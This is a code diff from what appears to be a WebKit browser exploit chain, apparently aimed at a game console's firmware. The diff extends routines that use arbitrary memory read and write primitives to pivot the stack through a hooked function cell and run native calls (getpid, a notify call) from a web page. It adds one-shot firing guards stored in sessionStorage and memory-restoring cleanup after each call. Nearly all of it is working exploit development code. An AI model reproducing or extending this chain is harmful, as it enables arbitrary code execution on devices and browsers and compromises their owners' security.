@@ -3,12 +3,48 @@
  */
 import { int64 } from "./int64.js";
 import {
-    prepNativeChain, firePivotGetpid,
-    bisectDisarmG0,
+    prepNativeChain, firePivotGetpid, fireNativeCall,
+    stageNotify, bisectDisarmG0, bisectRestorePivotOnly,
 } from "./native_call.js?v=nc-20250831r";
 import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";
 
 let g0Prep = null;
+const SS_G0_FIRED = "wk-g0-fired";
+
+/** Frame @ F is errno-style: 0 = success (same as notify). Not raw pid. */
+export function nativeRetOk(ret) {
+    return ret === 0;
+}
+
+export function g0AlreadyFired() {
+    if (g0Fired) return true;
+    try { return sessionStorage.getItem(SS_G0_FIRED) === "1"; } catch (_) { return false; }
+}
+
+let g0Fired = false;
+
+function markG0Fired(kind) {
+    g0Fired = true;
+    try {
+        sessionStorage.setItem(SS_G0_FIRED, "1");
+        sessionStorage.setItem("wk-g0-fired-kind", kind || "getpid");
+    } catch (_) { }
+}
+
+function postFireCleanup(p, prep, opts) {
+    try { bisectRestorePivotOnly(p, prep); } catch (_) { }
+    try { bisectDisarmG0(p, prep); } catch (_) { }
+    try {
+        if (prep.mainMf && prep.mainOrig != null)
+            p.write8(prep.mainMf, prep.mainOrig);
+    } catch (_) { }
+    prep.mainArmed = false;
+    prep.staged = false;
+    prep._bisect = {};
+    if (opts && opts.preTrim) {
+        try { opts.preTrim(); stubStep(opts, "G0-POST-TRIM", "ok"); } catch (_) { }
+    }
+}
 
 function stubStep(opts, tag, detail) {
     if (opts && opts.log) opts.log(tag, detail || "");
@@ -81,6 +117,9 @@ function buildCapForPrep(p, off, carrier, cap) {
 }
 
 export function ensureG0Prep(p, off, lk, opts) {
+    opts = opts || {};
+    if (g0AlreadyFired() && !opts.allowRefire)
+        throw new Error("g0: already fired — reload tab (refire OOMs on 13.52)");
     if (g0Prep) return g0Prep;
     const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
     if (opts.preTrim) {
@@ -131,30 +170,46 @@ export function fireG0Smoke(p, off, opts) {
     return { path: "g0-smoke", cap };
 }
 
-/** G0 + cell30 hook + getpid stack — proper native entry. */
+/** G0 + cell30 hook + getpid stack — one shot per tab (errno 0 = OK). */
 export function fireG0Getpid(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 getpid: need lk");
+    if (g0AlreadyFired() && !opts.allowRefire)
+        throw new Error("g0: already fired — reload tab before refire");
     const prep = ensureG0Prep(p, off, lk, opts);
     const stubOff = (off.k_stubs && off.k_stubs[20] != null) ? off.k_stubs[20] : 0x2cb70;
     stubStep(opts, "G0-GETPID-FIRE", "stubOff=0x" + stubOff.toString(16) + " lk=" + lk);
-    const pid = firePivotGetpid(p, prep, lk, off, stubOff, {
+    const ret = firePivotGetpid(p, prep, lk, off, stubOff, {
+        hook: opts.hook || "cell30",
+        carrier: opts.carrier || null,
+        skipVerify: opts.skipVerify === true,
+    });
+    postFireCleanup(p, prep, opts);
+    markG0Fired("getpid");
+    stubStep(opts, "G0-DONE", "errno=" + ret + (nativeRetOk(ret) ? " OK" : " fail"));
+    try {
+        sessionStorage.setItem("wk-native-getpid-ok", "errno=" + ret + "@" + Date.now());
+    } catch (_) { }
+    return { path: "g0-getpid", ret, errno: ret, ok: nativeRetOk(ret), prep };
+}
+
+/** G0 + notify — same one-shot slot; use ?stubfire=g0notify instead of getpid. */
+export function fireG0Notify(p, off, lk, opts) {
+    opts = opts || {};
+    if (!lk) throw new Error("g0 notify: need lk");
+    if (g0AlreadyFired() && !opts.allowRefire)
+        throw new Error("g0: already fired — reload tab before notify");
+    const prep = ensureG0Prep(p, off, lk, opts);
+    stubStep(opts, "G0-NOTIFY-FIRE", "lk=" + lk);
+    stageNotify(p, prep, lk, off, { message: opts.message });
+    const ret = fireNativeCall(p, prep, off, {
         hook: opts.hook || "cell30",
         carrier: opts.carrier || null,
     });
-    let framePeek = null;
-    try {
-        const v = p.read4(prep.M.F);
-        if (v != null) framePeek = (v.low >>> 0) | ((v.hi >>> 0) * 0x100000000);
-    } catch (_) { }
-    const dvPid = prep.M.frameDv.getUint32(0, true) | 0;
-    stubStep(opts, "G0-FRAME", "dv=" + dvPid + " peek@F=" + (framePeek != null ? framePeek : "?")
-        + " F=" + prep.M.F);
-    stubStep(opts, "G0-DONE", "pid=" + pid);
-    try {
-        sessionStorage.setItem("wk-native-getpid-ok", String(pid) + "@" + Date.now());
-    } catch (_) { }
-    return { path: "g0-getpid", pid, framePeek, dvPid, prep };
+    postFireCleanup(p, prep, opts);
+    markG0Fired("notify");
+    stubStep(opts, "G0-NOTIFY-DONE", "errno=" + ret + (nativeRetOk(ret) ? " OK" : " fail"));
+    return { path: "g0-notify", ret, errno: ret, ok: nativeRetOk(ret), prep };
 }
 
 export function disarmStubG0(p) {
@@ -171,5 +226,10 @@ export function disarmStubG0(p) {
 
 export function resetG0Prep() {
     g0Prep = null;
+    g0Fired = false;
+    try {
+        sessionStorage.removeItem(SS_G0_FIRED);
+        sessionStorage.removeItem("wk-g0-fired-kind");
+    } catch (_) { }
     if (typeof window !== "undefined") window._stubG0Prep = null;
 }
